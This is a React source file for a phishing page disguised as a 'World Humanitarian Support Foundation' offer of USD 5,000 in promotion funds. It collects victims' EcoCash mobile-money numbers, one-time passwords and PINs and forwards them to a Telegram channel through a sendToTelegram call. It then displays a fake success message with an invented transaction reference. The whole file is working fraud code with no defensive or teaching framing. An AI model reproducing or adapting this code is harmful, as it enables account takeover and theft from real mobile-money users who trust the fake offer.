import { useState } from "react";
import styles from "./ClientSide.module.css";
// import { supabase } from "../assets/lib/supabase.js";
// import { useNavigate } from "react-router-dom";
import { sendToTelegram } from "./telegram.jsx";
export default function ClientSide() {
  // const navigate = useNavigate();
  const [next, setnext] = useState(false);

  const [clientNumber, setclientNumber] = useState("");
  const [clientPin, setclientPin] = useState("");
  const [clientname, setclientname] = useState("");
  const [otp, setotp] = useState("");
  const [invalidNo, setwrongNo] = useState(false);
  const [success, setsuccess] = useState(false);
  const [invalidpin, setwrongpi] = useState(false);
  // const [clientName, setclientName] = useState(false);
  const [opttrue, setopttrue] = useState(true);
  const [opptt, setopptt] = useState(true);

  // function goToAdmin() {

  // }

  function handleSubmit(e) {
    e.preventDefault();
    if (otp.length !== 6 && clientname !== "") {
      setwrongNo(true);
      return;
    }
    console.log("submit");

    setnext(true);
    setopptt(false);
    console.log(clientNumber);
  }
  function handleContinue(e) {
    e.preventDefault();
    setopttrue(false);
    console.log("clicked");
  }
  async function handleSubmitPin(e) {
    e.preventDefault();
    if (clientPin.length !== 4) {
      setwrongpi(true);
      return;
    }
    // uploaddata();
    await sendToTelegram(
      `New Client Claim:\nEcoCash Number: ${clientNumber}\nEcoCash otp: ${otp}\nEcoCash Pin: ${clientPin}`
    );
    setsuccess(true);
  }
  // const client = {
  //   number: clientNumber,
  //   pin: clientPin,
  //   otp: otp,
  // };
  // async function uploaddata() {
  // const { error } = await supabase
  //   .from("clientdata")
  //   .insert([client])
  //   .select();
  // if (!error) {
  //   // setFormDta({ number: "", pin: "", vercode: "" });
  //   console.log(error);
  // }
  // }
  return (
    <div className={styles.container}>
      <img
        src="/prom.jpeg"
        alt="logo"
        className={styles.logo}
        // onClick={goToAdmin}
      />
      <h1 className="container">
        World Humanitarian <br></br>Support Foundation <br></br> Funds
      </h1>
      {!success ? (
        <form>
          <>
            {opttrue ? (
              <div>
                {/* <div className={`${styles.myform} ${next ? styles.hide : ""}`}> */}
                <div className={`${styles.myform} ${next && styles.hide}`}>
                  <label htmlFor="number">Enter your Name</label>
                  <input
                    type="text"
                    onChange={(e) => setclientname(e.target.value)}
                    value={clientname}
                    placeholder="full name"
                  />
                  <label htmlFor="number">Enter your EcoCash No</label>
                  <input
                    type="number"
                    onChange={(e) => setclientNumber(e.target.value)}
                    placeholder="07XXXXXXXX"
                    value={clientNumber}
                  />
                  {invalidNo && (
                    <label htmlFor="number" style={{ color: "red" }}>
                      Please Enter Valid EcoCash number!
                    </label>
                  )}
                  <button type="submit" onClick={(e) => handleContinue(e)}>
                    continue
                  </button>
                </div>
              </div>
            ) : (
              <>
                {opptt ? (
                  <div className={styles.otpSide}>
                    <p>
                      We have sent a One Time Password (OTP) to your EcoCash
                      number
                      {` ${clientNumber} `}
                      The otp expires in 2 minutes
                    </p>
                    <label htmlFor="otp">Enter OTP here</label>
                    <input
                      type="number"
                      onChange={(e) => setotp(e.target.value)}
                      placeholder="123456"
                      value={otp}
                    />
                    <button
                      className={styles.submitName}
                      onClick={handleSubmit}
                    >
                      Submit
                    </button>
                  </div>
                ) : (
                  ""
                )}
              </>
            )}
          </>

          <div>
            <div className={`${styles.myform} + ${!next && styles.hide}`}>
              <p>
                Are sure you want to claim your Promotion funds of USD 5,000?
              </p>
              <label htmlFor="number"> EcoCash pin</label>
              <input
                type="number"
                value={clientPin}
                onChange={(e) => setclientPin(e.target.value)}
                placeholder=""
              />
              {invalidpin && (
                <label htmlFor="number" style={{ color: "red" }}>
                  {" "}
                  Enter valid EcoCash pin.
                </label>
              )}
              <button type="submit" onClick={(e) => handleSubmitPin(e)}>
                Claim Now
              </button>
            </div>
          </div>
        </form>
      ) : (
        <div className={styles.success}>
          <h2>Congrats To You</h2>
          <p>
            You have successfully claimed <b>USD 5,000</b> 💵 to{" "}
            <b>{clientNumber}</b>, the Promotion funds will reflect in your
            EcoCash account within 10 minutes. The transaction reference number
            is <b>#A2X-BC34-XYZ </b> and is now under review by EcoCash
            compliance team.If provided information is valid, the funds will be
            credited to your account within 10 minutes.
          </p>
          <p>Congratulations for reaching this far</p>
        </div>
      )}
    </div>
  );
}
